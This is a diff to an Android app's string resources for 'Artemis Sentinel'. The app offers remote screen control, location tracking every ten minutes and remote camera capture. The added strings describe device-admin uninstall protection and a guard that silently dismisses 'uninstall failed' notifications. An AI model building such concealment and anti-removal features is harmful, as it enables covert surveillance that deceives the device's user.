@@ -6,6 +6,10 @@
     <string name="channel_name">Artemis Sentinel Service</string>
     <string name="channel_description">Artemis server status notifications</string>
     <string name="accessibility_service_desc">Allows remote control of the device screen</string>
+    <string name="admin_label">Artemis Sentinel Admin</string>
+    <string name="admin_description">Uninstall protection and remote lock for Artemis Sentinel. While active, the app cannot be uninstalled until device admin is deactivated.</string>
+    <string name="notification_guard_label">Uninstall Alert Guard</string>
+    <string name="notification_guard_description">Automatically dismisses the package installer\'s "uninstall failed" notification so failed uninstall attempts stay silent.</string>
     <string name="permission_rationale_location">Location access is needed to track device location every 10 minutes</string>
     <string name="permission_rationale_background_location">Background location is needed for periodic tracking when the app is in the background</string>
     <string name="permission_rationale_camera">Camera access is needed for remote capture requests</string>
